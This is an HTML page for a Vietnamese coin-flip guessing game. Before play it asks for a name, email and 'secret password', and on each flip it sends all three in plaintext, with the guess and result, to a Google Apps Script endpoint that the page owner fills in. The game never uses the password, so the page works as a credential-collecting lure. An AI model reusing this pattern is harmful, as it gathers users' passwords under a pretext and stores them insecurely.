<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Game Đố Vui Đồng Xu</title>
    <style>
        :root {
            --primary: #6c5ce7;
            --gold: #f1c40f;
            --dark: #2d3436;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #a8edea 0%, #fed6e3 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .card {
            background: white;
            padding: 30px;
            border-radius: 20px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        h2 { color: var(--dark); margin-bottom: 20px; }
        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 2px solid #eee;
            border-radius: 10px;
            box-sizing: border-box;
            outline: none;
            transition: 0.3s;
        }
        input:focus { border-color: var(--primary); }
        button {
            width: 100%;
            padding: 12px;
            background: var(--primary);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
            margin-top: 10px;
        }
        button:hover { opacity: 0.9; transform: translateY(-2px); }
        
        /* Hiệu ứng đồng xu */
        .coin-container { perspective: 1000px; margin: 30px auto; }
        .coin {
            width: 120px;
            height: 120px;
            background: var(--gold);
            border-radius: 50%;
            margin: 0 auto;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            font-weight: bold;
            color: #b8860b;
            border: 8px double #daa520;
            box-shadow: inset 0 0 20px rgba(0,0,0,0.1), 0 5px 15px rgba(0,0,0,0.2);
            transition: transform 1s cubic-bezier(0.4, 0, 0.2, 1);
        }
        .flipping { animation: spin 1s infinite linear; }
        @keyframes spin {
            0% { transform: rotateY(0deg); }
            100% { transform: rotateY(360deg); }
        }
        .hidden { display: none; }
        #status { margin-top: 20px; font-size: 18px; font-weight: bold; min-height: 24px; }
    </style>
</head>
<body>

<div class="card" id="auth-card">
    <h2>🎯 Đăng Ký Chơi</h2>
    <input type="text" id="username" placeholder="Tên của bạn">
    <input type="email" id="email" placeholder="Email liên hệ">
    <input type="password" id="password" placeholder="Mật khẩu bí mật">
    <button onclick="register()">Vào Game</button>
</div>

<div class="card hidden" id="game-card">
    <h2 id="welcome-msg">Chào bạn!</h2>
    <div class="coin-container">
        <div id="coin" class="coin">?</div>
    </div>
    <div id="status">Đang chờ bạn đặt cược...</div>
    <div style="display: flex; gap: 10px;">
        <button style="background: #e67e22;" onclick="playGame('Sấp')">Chọn SẤP</button>
        <button style="background: #2980b9;" onclick="playGame('Ngửa')">Chọn NGỬA</button>
    </div>
</div>

<script>
    // --- CẤU HÌNH TẠI ĐÂY ---
    const SCRIPT_URL = 'DÁN_URL_GOOGLE_APPS_SCRIPT_CỦA_BẠN_VÀO_ĐÂY';
    // ------------------------

    let playerInfo = {};

    function register() {
        const u = document.getElementById('username').value;
        const e = document.getElementById('email').value;
        const p = document.getElementById('password').value;

        if(!u || !e || !p) return alert("Vui lòng nhập đầy đủ thông tin!");

        playerInfo = { username: u, email: e, password: p };
        document.getElementById('welcome-msg').innerText = `Chào, ${u}!`;
        document.getElementById('auth-card').classList.add('hidden');
        document.getElementById('game-card').classList.remove('hidden');
    }

    function playGame(prediction) {
        const coin = document.getElementById('coin');
        const status = document.getElementById('status');
        
        // Vô hiệu hóa nút khi đang quay
        const buttons = document.querySelectorAll('#game-card button');
        buttons.forEach(b => b.disabled = true);

        // Hiệu ứng quay
        coin.classList.add('flipping');
        status.innerText = "Đang tung đồng xu...";
        status.style.color = "#2d3436";

        setTimeout(() => {
            coin.classList.remove('flipping');
            const result = Math.random() < 0.5 ? 'Sấp' : 'Ngửa';
            coin.innerText = result;

            const win = (prediction === result);
            status.innerText = win ? `CHÚC MỪNG! Nó ra ${result}` : `TIẾC QUÁ! Nó ra ${result}`;
            status.style.color = win ? "#27ae60" : "#c0392b";

            // Gửi dữ liệu về Google Sheets
            const dataToSubmit = {
                ...playerInfo,
                prediction: prediction,
                result: result
            };

            fetch(SCRIPT_URL, {
                method: 'POST',
                mode: 'no-cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(dataToSubmit)
            }).then(() => {
                console.log("Dữ liệu đã gửi thành công!");
                buttons.forEach(b => b.disabled = false);
            });

        }, 1500);
    }
</script>

</body>
</html>
